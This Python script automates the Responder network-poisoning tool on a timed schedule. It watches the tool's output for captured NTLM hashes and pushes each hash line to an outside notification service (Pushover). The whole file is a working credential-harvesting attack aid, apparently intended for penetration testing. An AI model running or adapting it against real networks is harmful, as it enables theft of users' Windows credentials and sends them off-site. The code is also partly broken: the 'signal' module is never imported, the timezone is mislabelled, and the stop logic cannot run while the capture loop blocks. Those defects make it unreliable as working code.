import os
import time
import subprocess
import requests
from datetime import datetime, timedelta
import pytz
import re

# ASCII
ascii_art = """
                                                                                                                                                          
                                                                                                                                                          
   ,---,                        ___                       ,-.----.                                                                                        
  '  .' \                     ,--.'|_                     \    /  \                        ,-.----.                              ,---,                    
 /  ;    '.             ,--,  |  | :,'   ,---.      ,---,.;   :    \                       \    /  \    ,---.        ,---,     ,---.'|            __  ,-. 
:  :       \          ,'_ /|  :  : ' :  '   ,'\   ,'  .' ||   | .\ :             .--.--.   |   :    |  '   ,'\   ,-+-. /  |    |   | :          ,' ,'/ /| 
:  |   /\   \    .--. |  | :.;__,'  /  /   /   |,---.'   ,.   : |: |    ,---.   /  /    '  |   | .\ : /   /   | ,--.'|'   |    |   | |   ,---.  '  | |' | 
|  :  ' ;.   : ,'_ /| :  . ||  |   |  .   ; ,. :|   |    ||   |  \ :   /     \ |  :  /`./  .   : |: |.   ; ,. :|   |  ,"' |  ,--.__| |  /     \ |  |   ,' 
|  |  ;/  \   \|  ' | |  . .:__,'| :  '   | |: ::   :  .' |   : .  /  /    /  ||  :  ;_    |   |  \ :'   | |: :|   | /  | | /   ,'   | /    /  |'  :  /   
'  :  | \  \ ,'|  | ' |  | |  '  : |__'   | .; ::   |.'   ;   | |  \ .    ' / | \  \    `. |   : .  |'   | .; :|   | |  | |.   '  /  |.    ' / ||  | '    
|  |  '  '--'  :  | : ;  ; |  |  | '.'|   :    |`---'     |   | ;\  \'   ;   /|  `----.   \:     |`-'|   :    ||   | |  |/ '   ; |:  |'   ;   /|;  : |    
|  :  :        '  :  `--'   \ ;  :    ;\   \  /           :   ' | \.''   |  / | /  /`--'  /:   : :    \   \  / |   | |--'  |   | '/  ''   |  / ||  , ;    
|  | ,'        :  ,      .-./ |  ,   /  `----'            :   : :-'  |   :    |'--'.     / |   | :     `----'  |   |/      |   :    :||   :    | ---'     
`--''           `--`----'      ---`-'                     |   |.'     \   \  /   `--'---'  `---'.|             '---'        \   \  /   \   \  /           
                                                          `---'        `----'                `---`                           `----'     `----'            
                                                                                                                                                          
Automated Responder Script with Notifications
---------------------------------------------
"""

# Pushover Configuration
PUSHOVER_USER_KEY = 'your_user_key'  # Change this to your pusher API 
PUSHOVER_API_TOKEN = 'your_api_token' 

# Function to send notification via Pushover
def send_notification(message):
    data = {
        "token": PUSHOVER_API_TOKEN,
        "user": PUSHOVER_USER_KEY,
        "message": message
    }
    response = requests.post("https://api.pushover.net/1/messages.json", data=data)
    if response.status_code == 200:
        print(f"Notification sent: {message}")
    else:
        print(f"Failed to send notification: {response.text}")

# Get Current Time in EST 
def get_current_time_est():
        est = pytz.timezone('America/Mexico_City') # Change your EST time in format accepted by Pytz > https://gist.github.com/heyalexej/8bf688fd67d7199be4a1682b3eec7568
        return datetime.now(est).strftime("%Y-%m-%d %H:%M:%S %Z%z")

# Start Responder with output capture and subprocess so it can be stopped
def start_responder(interface='eth0'):
    current_time_est = get_current_time_est()
    send_notification(f'Responder starting on {interface} at {current_time_est} (EST)')
    print(f"Starting Responder at {current_time_est} (EST)")

    responder_cmd = f'sudo python3 /usr/share/responder/Responder.py -I {interface} ' # Command to be runned
    
    # Start Responder in a new process group
    process = subprocess.Popen(
        responder_cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        preexec_fn=os.setsid
    )
    
    # Regex pattern for detecting hashes in output/ this can also be setup to only send a notification when a hash is captured and dont send the hash 
    hash_pattern = re.compile(r'(NTLMv2|NTLMv1|hash captured)', re.IGNORECASE)
    
    # Capture output continuously
    while True:
        line = process.stdout.readline()
        if not line and process.poll() is not None:
            break  # Exit loop if process ends and there's no more output
        if line:
            decoded_line = line.decode("utf-8").strip()
            print(decoded_line)
            
            # Send notification if a hash is detected
            if hash_pattern.search(decoded_line):
                send_notification(f"Hash captured: {decoded_line}")
                print("Notification sent for captured hash.")
    
    return process

# Stop Responder using process group termination
def stop_responder(process):
    current_time_est = get_current_time_est()
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # Terminate the entire process group
        process.wait()  # Wait for process to fully stop
        send_notification(f'Responder stopped at {current_time_est} (EST)')
        print(f"Responder stopped at {current_time_est} (EST)")
    else:
        print("Responder was not running.")

# Main function for scheduling
def main():
    print(ascii_art) # :) 

    # Show current detected EST when prompting 
    current_est_time = get_current_time_est()
    print(f"Current detected EST time is: {current_est_time}")
    
    # Get user input for schedule
    start_time = input("Enter the time to start Responder (HH:MM): ")
    run_duration = int(input("Enter the duration to run Responder in minutes: "))
    wait_time = int(input("Enter the wait time before next session in minutes: "))
    end_time = input("Enter the time to stop running Responder (HH:MM): ")
    
    # Convert end_time to a time object for comparison
    end_time_dt = datetime.strptime(end_time, "%H:%M").time()
    
    while True:
        current_time = datetime.now().strftime("%H:%M")
        
        if current_time >= start_time and datetime.now().time() < end_time_dt:
            # Start Responder
            responder_process = start_responder()

            # Calculate stop time
            stop_time = datetime.now() + timedelta(minutes=run_duration)
            while datetime.now() < stop_time:
                time.sleep(1)
            
            # Stop Responder
            stop_responder(responder_process)
            
            send_notification(f'Responder ran for {run_duration} minutes and has stopped.')
            print(f"Waiting for {wait_time} minutes before the next session...")
            
            # Wait for the specified wait_time before the next session
            time.sleep(wait_time * 60)  # Convert wait time to seconds
        else:
            # Break loop if end_time has passed
            if datetime.now().time() >= end_time_dt:
                current_time_est = get_current_time_est()
                send_notification(f"Schedule completed for the day at {current_time_est} (EST). Stopping Responder sessions.")
                print(f"Schedule completed for the day at {current_time_est} (EST)")
                break
            
            # Sleep for a minute before checking the time again
            time.sleep(60)

if __name__ == "__main__":
    main()
